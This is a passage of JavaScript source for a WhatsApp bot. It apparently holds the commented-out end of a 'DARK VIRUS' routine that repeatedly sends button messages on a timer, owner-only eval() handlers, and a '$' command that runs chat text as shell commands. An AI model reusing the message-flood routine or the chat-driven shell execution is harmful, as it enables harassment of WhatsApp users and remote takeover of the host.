// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
//  { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quoted: lep }
// ]})
// await sleep(ms(waktu))
// }
// dunskybot.reply(txts)
// break

default:
if (budy.startsWith('=>')) {
if (!itsMediablo) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return dunskybot.reply(bang)
}
try {
dunskybot.reply(util.format(eval(`(async () => { ${budy.slice(3)} })()`)))
} catch (e) {
dunskybot.reply(String(e))
}
}
if (budy.startsWith('>')) {
if (!itsMediablo) return
try {
let evaled = await eval(budy.slice(2))
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
await dunskybot.reply(evaled)
} catch (err) {
dunskybot.reply(String(err))
}
}
if (budy.startsWith('<')) {
if (!itsMediablo) return
try {
return dunskybot.reply(JSON.stringify(eval(`${args.join(' ')}`),null,'\t'))
} catch (e) {
reply(e)
}
}
if (budy.startsWith('$')){
if (!itsMediablo) return
qur = budy.slice(2)
exec(qur, (err, stdout) => {
if (err) return dunskybot.reply(`${err}`)
if (stdout) {
dunskybot.reply(stdout)
}
})
}

if (dunskybot.chat.endsWith('@s.whatsapp.net') && !isCmd) {
    let room = Object.values(anon.anonymous).find(p => p.state == "CHATTING" && p.check(sender))
    if (room) {
    let other = room.other(sender)
    m.copyNForward(other, true, dunskybot.quoted && dunskybot.quoted.fromMe ? {
    contextInfo: {
    ...m.msg.contextInfo,
    forwardingScore: 0,
    isForwarded: true,
    participant: other
    }
    } : {})
    }
    }

    if (isCmd && budy.toLowerCase() != undefined) {
        if (dunskybot.chat.endsWith('broadcast')) return
        if (dunsky.isBaileys) return
        let msgs = global.db.database
        if (!(budy.toLowerCase() in msgs)) return
        dunsky.copyNForward(dunskybot.chat, msgs[budy.toLowerCase()], true)
        }
}

   
} catch (err) {
console.log(util.format(err))
let e = String(err)
dunsky.sendMessage("62895600000048@s.whatsapp.net", { text: "Hallo Owner Sepertinya Ada Yang Error Harap Di Perbaiki" + util.format(e), 
contextInfo:{
forwardingScore: 5, 
isForwarded: true
}})
}
} 